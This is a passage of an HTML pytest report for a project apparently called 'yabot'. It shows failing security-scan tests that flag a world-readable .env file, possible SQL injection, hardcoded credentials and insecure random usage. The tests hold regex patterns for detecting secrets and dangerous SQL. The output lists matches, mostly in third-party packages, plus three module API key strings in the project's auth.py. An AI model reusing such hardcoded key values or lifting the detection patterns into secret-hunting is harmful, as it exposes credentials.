(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/events/utils/data.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer -&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;(?i)api[_-]?key\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;api_key=&quot;narrative_module_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;(?i)api[_-]?key\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;api_key=&quot;gamification_module_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;(?i)api[_-]?key\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;api_key=&quot;admin_module_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/events/correlation.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/events/correlation.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/events/correlation.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/events/correlation.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;)]</span><br/><span class="error">E       assert 230 == 0</span><br/><span class="error">E        +  where 230 = len([(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pycodestyle.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\...lib/python3.12/site-packages/configargparse.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), ...])</span><br/><br/>tests/security/test_vulnerability_scanning.py:108: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_file_permissions</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_vulnerability_scanning.TestVulnerabilityScanning object at 0x7d170154e8d0&gt;<br/><br/>    @pytest.mark.security<br/>    def test_file_permissions(self):<br/>        &quot;&quot;&quot;Test that sensitive files have appropriate permissions.&quot;&quot;&quot;<br/>        project_root = Path(__file__).parent.parent.parent<br/>    <br/>        sensitive_files = [<br/>            &#x27;.env&#x27;,<br/>            &#x27;.env.local&#x27;,<br/>            &#x27;config.json&#x27;,<br/>            &#x27;secrets.json&#x27;,<br/>        ]<br/>    <br/>        for filename in sensitive_files:<br/>            file_path = project_root / filename<br/>            if file_path.exists():<br/>                # Check file permissions (should not be world-readable)<br/>                import stat<br/>                file_stat = file_path.stat()<br/>                mode = stat.filemode(file_stat.st_mode)<br/>    <br/>                # Should not have world read permissions<br/>&gt;               assert not (file_stat.st_mode &amp; stat.S_IROTH), f&quot;File {filename} is world-readable: {mode}&quot;<br/><span class="error">E               AssertionError: File .env is world-readable: -rw-rw-r--</span><br/><span class="error">E               assert not (33204 &amp; 4)</span><br/><span class="error">E                +  where 33204 = os.stat_result(st_mode=33204, st_ino=1322803, st_dev=2065, st_nlink=1, st_uid=1000, st_gid=1000, st_size=210, st_atime=1758334855, st_mtime=1758334831, st_ctime=1758334831).st_mode</span><br/><span class="error">E                +  and   4 = &lt;module &#x27;stat&#x27; (frozen)&gt;.S_IROTH</span><br/><br/>tests/security/test_vulnerability_scanning.py:131: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_sql_injection_patterns</td>
          <td class="col-duration">4.72</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_vulnerability_scanning.TestVulnerabilityScanning object at 0x7d170154dfa0&gt;<br/><br/>    @pytest.mark.security<br/>    def test_sql_injection_patterns(self):<br/>        &quot;&quot;&quot;Test for SQL injection vulnerabilities in code.&quot;&quot;&quot;<br/>        project_root = Path(__file__).parent.parent.parent<br/>    <br/>        # Dangerous SQL patterns<br/>        dangerous_patterns = [<br/>            r&#x27;(?i)SELECT\s+\*\s+FROM\s+\w+\s+WHERE\s+.*%s&#x27;,<br/>            r&#x27;(?i)INSERT\s+INTO\s+\w+\s+.*%s&#x27;,<br/>            r&#x27;(?i)UPDATE\s+\w+\s+SET\s+.*%s&#x27;,<br/>            r&#x27;(?i)DELETE\s+FROM\s+\w+\s+WHERE\s+.*%s&#x27;,<br/>            r&#x27;execute\s*\(\s*[&quot;\&#x27;].*%s.*[&quot;\&#x27;]&#x27;,<br/>        ]<br/>    <br/>        import re<br/>        found_issues = []<br/>    <br/>        for file_path in project_root.rglob(&#x27;*.py&#x27;):<br/>            if &#x27;test&#x27; in str(file_path):<br/>                continue<br/>    <br/>            try:<br/>                content = file_path.read_text(encoding=&#x27;utf-8&#x27;)<br/>                for pattern in dangerous_patterns:<br/>                    if re.search(pattern, content):<br/>                        found_issues.append((str(file_path), pattern))<br/>            except (UnicodeDecodeError, FileNotFoundError):<br/>                continue<br/>    <br/>&gt;       assert len(found_issues) == 0, f&quot;Found potential SQL injection vulnerabilities: {found_issues}&quot;<br/><span class="error">E       AssertionError: Found potential SQL injection vulnerabilities: [(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/peewee.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/reflection.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/apsw_ext.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/cockroachdb.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/sqlcipher_ext.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/bandit/plugins/injection_sql.py&#x27;, &#x27;(?i)UPDATE\\s+\\w+\\s+SET\\s+.*%s&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/bandit/plugins/injection_sql.py&#x27;, &#x27;(?i)DELETE\\s+FROM\\s+\\w+\\s+WHERE\\s+.*%s&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/bandit/plugins/injection_sql.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/sem/chat80.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;)]</span><br/><span class="error">E       assert 9 == 0</span><br/><span class="error">E        +  where 9 = len([(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/peewee.py&#x27;, &#x27;execute\\s*\\(\\s*[&quot;\\\&#x27;].*%s.*[&quot;\\\&#x27;]&#x27;)...os/yabot/venv/lib/python3.12/site-packages/bandit/plugins/injection_sql.py&#x27;, &#x27;(?i)UPDATE\\s+\\w+\\s+SET\\s+.*%s&#x27;), ...])</span><br/><br/>tests/security/test_vulnerability_scanning.py:193: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_hardcoded_credentials</td>
          <td class="col-duration">4.12</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_vulnerability_scanning.TestVulnerabilityScanning object at 0x7d170154fdd0&gt;<br/><br/>    @pytest.mark.security<br/>    def test_hardcoded_credentials(self):<br/>        &quot;&quot;&quot;Test for hardcoded credentials in source code.&quot;&quot;&quot;<br/>        project_root = Path(__file__).parent.parent.parent<br/>    <br/>        # Common credential patterns<br/>        credential_patterns = [<br/>            r&#x27;password\s*=\s*[&quot;\&#x27;][^&quot;\&#x27;]+[&quot;\&#x27;]&#x27;,<br/>            r&#x27;api_key\s*=\s*[&quot;\&#x27;][^&quot;\&#x27;]+[&quot;\&#x27;]&#x27;,<br/>            r&#x27;secret_key\s*=\s*[&quot;\&#x27;][^&quot;\&#x27;]+[&quot;\&#x27;]&#x27;,<br/>            r&#x27;token\s*=\s*[&quot;\&#x27;][^&quot;\&#x27;]+[&quot;\&#x27;]&#x27;,<br/>        ]<br/>    <br/>        import re<br/>        found_credentials = []<br/>    <br/>        for file_path in project_root.rglob(&#x27;*.py&#x27;):<br/>            if &#x27;test&#x27; in str(file_path):<br/>                continue<br/>    <br/>            try:<br/>                content = file_path.read_text(encoding=&#x27;utf-8&#x27;)<br/>                for pattern in credential_patterns:<br/>                    matches = re.findall(pattern, content, re.IGNORECASE)<br/>                    for match in matches:<br/>                        # Skip obvious test/placeholder values<br/>                        if not any(placeholder in match.lower() for placeholder in<br/>                                 [&#x27;test&#x27;, &#x27;dummy&#x27;, &#x27;fake&#x27;, &#x27;example&#x27;, &#x27;placeholder&#x27;, &#x27;your_&#x27;, &#x27;change_me&#x27;]):<br/>                            found_credentials.append((str(file_path), match))<br/>            except (UnicodeDecodeError, FileNotFoundError):<br/>                continue<br/>    <br/>&gt;       assert len(found_credentials) == 0, f&quot;Found hardcoded credentials: {found_credentials}&quot;<br/><span class="error">E       AssertionError: Found hardcoded credentials: [(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pycodestyle.py&#x27;, &quot;token=&#x27;,&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/config.py&#x27;, &quot;SECRET_KEY = &#x27;development key&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/types.py&#x27;, &quot;password=&#x27;password1&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/starlette/datastructures.py&#x27;, &#x27;password=&quot;********&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/httpx/_urls.py&#x27;, &#x27;password=&quot;a secret&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/astroid/rebuilder.py&#x27;, &#x27;token = &quot;async&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/astroid/rebuilder.py&#x27;, &#x27;token = &quot;def&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/astroid/rebuilder.py&#x27;, &#x27;token = &quot;class&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/util.py&#x27;, &#x27;TOKEN = &quot;done.&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;token = &quot;...&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;token = &quot;..&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;token = &quot;...&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;token = &quot; * [would prune] &quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/bandit/plugins/general_hardcoded_password.py&#x27;, &#x27;password=&quot;blerg&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/bandit/plugins/general_hardcoded_password.py&#x27;, &#x27;password=&quot;Admin&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/signature.py&#x27;, &#x27;token=&quot;kkk9d7dh3k39sjv7&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/authorization_server.py&#x27;, &#x27;token=&quot;hh5s93j4hdidpola&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_internal/utils/misc.py&#x27;, &#x27;password = &quot;:****&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/tokenize/treebank.py&#x27;, &quot;token = &#x27;Good muffins cost $3.88 in New (York). Please (buy) me two of them. (Thanks).&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pymongo/asynchronous/mongo_client.py&#x27;, &#x27;password=&quot;pass/word&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py&#x27;, &#x27;password=&quot;pass/word&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/models/base.py&#x27;, &#x27;API_KEY = &quot;api_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/models/base.py&#x27;, &#x27;TOKEN = &quot;token&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/report/schemas/v3_0/main.py&#x27;, &#x27;api_key = &quot;api_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/report/schemas/v3_0/main.py&#x27;, &#x27;token = &quot;token&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/discord.py&#x27;, &quot;token=&#x27;{token}&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/discord.py&#x27;, &quot;token=&#x27;{token}&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/telegram.py&#x27;, &quot;token=&#x27;{token}&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/telegram.py&#x27;, &quot;token=&#x27;{token}&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/slack.py&#x27;, &quot;token=&#x27;{token}&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/slack.py&#x27;, &quot;token=&#x27;{token}&#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dateutil/parser/_parser.py&#x27;, &quot;token = &#x27; &#x27;&quot;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/py/_path/svnwc.py&#x27;, &#x27;password=&quot;%s&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/util.py&#x27;, &#x27;api_key = &quot;api_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/util.py&#x27;, &#x27;token = &quot;token&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;api_key=&quot;narrative_module_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;api_key=&quot;gamification_module_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/src/shared/api/auth.py&#x27;, &#x27;api_key=&quot;admin_module_key&quot;&#x27;)]</span><br/><span class="error">E       assert 38 == 0</span><br/><span class="error">E        +  where 38 = len([(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pycodestyle.py&#x27;, &quot;token=&#x27;,&#x27;&quot;), (&#x27;/home/azureuser/repo...ret&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/astroid/rebuilder.py&#x27;, &#x27;token = &quot;async&quot;&#x27;), ...])</span><br/><br/>tests/security/test_vulnerability_scanning.py:227: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_insecure_random_usage</td>
          <td class="col-duration">0.98</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.security.test_vulnerability_scanning.TestVulnerabilityScanning object at 0x7d170154ff20&gt;<br/><br/>    @pytest.mark.security<br/>    def test_insecure_random_usage(self):<br/>        &quot;&quot;&quot;Test for usage of insecure random functions.&quot;&quot;&quot;<br/>        project_root = Path(__file__).parent.parent.parent<br/>    <br/>        insecure_patterns = [<br/>            r&#x27;import\s+random\b&#x27;,<br/>            r&#x27;from\s+random\s+import&#x27;,<br/>            r&#x27;random\.random\(\)&#x27;,<br/>            r&#x27;random\.choice\(&#x27;,<br/>            r&#x27;random\.randint\(&#x27;,<br/>        ]<br/>    <br/>        import re<br/>        found_issues = []<br/>    <br/>        for file_path in project_root.rglob(&#x27;*.py&#x27;):<br/>            if &#x27;test&#x27; in str(file_path):<br/>                continue<br/>    <br/>            try:<br/>                content = file_path.read_text(encoding=&#x27;utf-8&#x27;)<br/>                for pattern in insecure_patterns:<br/>                    if re.search(pattern, content):<br/>                        # Check if it&#x27;s used for security-sensitive operations<br/>                        if any(keyword in content.lower() for keyword in [&#x27;token&#x27;, &#x27;key&#x27;, &#x27;secret&#x27;, &#x27;password&#x27;, &#x27;auth&#x27;]):<br/>                            found_issues.append((str(file_path), pattern))<br/>            except (UnicodeDecodeError, FileNotFoundError):<br/>                continue<br/>    <br/>&gt;       assert len(found_issues) == 0, f&quot;Found insecure random usage in security contexts: {found_issues}&quot;<br/><span class="error">E       AssertionError: Found insecure random usage in security contexts: [(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/coverage/sqldata.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/click/_compat.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/cluster.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/cluster.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/cluster.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/sentinel.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/sentinel.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/sentinel.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/regex/_regex_core.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/featstruct.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/probability.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/probability.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/probability.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/probability.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pymongo/message.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pymongo/message.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pymongo/topology_description.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/rdata.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/asyncquery.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/asyncquery.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/query.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/query.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/renderer.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/renderer.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/rdataset.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/resolver.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/rich/style.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/rich/progress.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/rich/progress.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/rich/live.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/rich/live.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/rich/live.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/std.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/boltons/ecoutils.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/boltons/setutils.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/boltons/iterutils.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/boltons/iterutils.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiohttp/connector.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/jinja2/filters.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/jinja2/filters.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/jinja2/utils.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/sqlite_udf.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/glom/grouping.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/glom/grouping.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/fields.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/fields.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/generator.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/cli.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/cli.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/proxy.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/faker/proxy.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/commands/helpers.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/commands/helpers.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/asyncio/cluster.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/asyncio/cluster.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/asyncio/sentinel.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/asyncio/sentinel.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/redis/asyncio/sentinel.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/zmq/sugar/socket.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/common/security.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/jose/rfc7519/jwt.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/jose/rfc7519/jwt.py&#x27;, &#x27;random\\.choice\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/rich/style.py&#x27;, &#x27;from\\s+random\\s+import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/rich/progress.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/rich/progress.py&#x27;, &#x27;random\\.randint\\(&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/rich/live.py&#x27;, &#x27;import\\s+random\\b&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/rich/live.py&#x27;, &#x27;random\\.random\\(\\)&#x27;), 